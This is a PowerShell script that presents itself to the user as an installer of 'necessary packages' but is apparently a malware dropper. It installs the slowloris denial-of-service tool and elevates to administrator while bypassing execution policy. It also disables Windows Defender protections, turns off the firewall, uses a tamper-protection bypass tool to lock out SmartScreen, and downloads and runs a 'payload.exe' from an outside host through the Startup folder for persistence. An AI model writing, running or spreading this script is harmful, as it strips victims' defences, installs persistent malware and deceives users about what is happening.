$pythonUrl = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
$pythonInstaller = "$env:TEMP\python-3.9.7-amd64.exe"
Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller -UseBasicParsing
Start-Process -Wait -FilePath $pythonInstaller -ArgumentList "/quiet", "PrependPath=1" -Verb RunAs
Remove-Item -Path $pythonInstaller -Force
$pythonBinFolder = (Get-Command python).Source.Substring(0, (Get-Command python).Source.LastIndexOf('\'))
$env:Path += ";$pythonBinFolder"
Start-Process -FilePath "cmd.exe" -ArgumentList "/K pip install slowloris" -WindowStyle Hidden

# Check for permissions
$checkAdmin = icacls "$env:SYSTEMROOT\system32\config\system"
if ($checkAdmin -notmatch "Successfully processed 1 files; Failed processing 0 files") {
    Write-Host "Requesting administrative privileges..."
    Start-Process -FilePath PowerShell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

Write-Host "Hey! Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!"
Start-Sleep -Seconds 5

Write-Host "Installing Necessary Packages.....Please Wait......."

$cred = Get-Credential -Credential "your_username" # You will be prompted to enter the password securely

# Make web requests with Basic authentication and Basic parsing
Invoke-WebRequest -Uri "https://example.com/api/endpoint1" -Credential $cred -UseBasicParsing
Invoke-WebRequest -Uri "https://example.com/api/endpoint2" -Credential $cred -UseBasicParsing
Invoke-WebRequest -Uri "https://example.com/api/endpoint3" -Credential $cred -UseBasicParsing

Set-MpPreference -ExclusionExtension ".bat",".exe"
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection Disable
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8

netsh advfirewall set allprofiles state off

$downloadUrl = "https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile "$env:TEMP\NSudo.exe"

$systemRoot = $env:SystemRoot
$system32Path = Join-Path $systemRoot "System32"
$iLoveYouHandeErcel = "smartscreen.exe"
$smartscreenPath = Join-Path $system32Path $iLoveYouHandeErcel

Start-Process -FilePath "$env:TEMP\NSudo.exe" -ArgumentList "-U:T -ShowWindowMode:Hide icacls `"$smartscreenPath`" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18" -Wait

Stop-Service -Name WinDefend

$startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe")

Start-Process -FilePath "$startupFolder\payload.exe"
